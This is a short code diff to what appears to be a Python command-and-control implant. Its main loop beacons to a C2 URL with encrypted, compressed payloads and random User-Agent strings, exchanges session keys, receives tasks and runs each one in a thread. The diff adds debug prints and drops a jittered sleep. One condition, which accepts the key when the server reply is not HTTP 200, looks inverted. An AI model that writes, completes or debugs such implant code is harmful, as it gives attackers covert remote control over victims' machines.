@@ -322,6 +322,7 @@ def main():
         # first beacon for key exchange
         # First beacon: send public session key proposal
         if session_key is None:  # First beacon - propose key
+            print("[+] New session ...")
             proposal = {
                 "key_exchange": base64.b64encode(session_key_proposed).decode(),
                 "id": implant_id,
@@ -332,13 +333,16 @@ def main():
             compressed = zlib.compress(json_bytes, level=9)
             payload_to_send = b"\x01" + compressed if len(compressed) < len(json_bytes) else b"\x00" + json_bytes
             enc_payload = encrypt(payload_to_send)  # Uses BEACON_KEY
+            print("[+] Sending new beacon with proposed key")
             resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)
                 
             if resp.status_code != 200:
                 session_key = session_key_proposed  # Server accepted implicitly
-                time.sleep(get_jittered_sleep())
+                print("[+] Sent successfully ..")
                 continue
         else:
+            print("[+] Sending normal beacon ...")
+            print(f"[+] Results {pending_results}")
             # Normal beacon            
             payload = {
                 "id": implant_id,
@@ -365,6 +369,7 @@ def main():
                     continue
                 dec_resp = decrypt(resp.content)
                 tasks = json.loads(dec_resp).get("tasks", [])
+                print(f"[+] Tasks {tasks}")
                 ack_ids = json.loads(dec_resp).get("ack_ids", [])
 
                 # ACK processed results
@@ -372,6 +377,7 @@ def main():
                     pending_results = [r for r in pending_results if r["task_id"] not in ack_ids]
 
                 for task in tasks:
+                    print("[+] Queuing task : ", task)
                     threading.Thread(target=handle_task, args=(task,)).start()
 
             except Exception:
@@ -710,5 +716,6 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
 
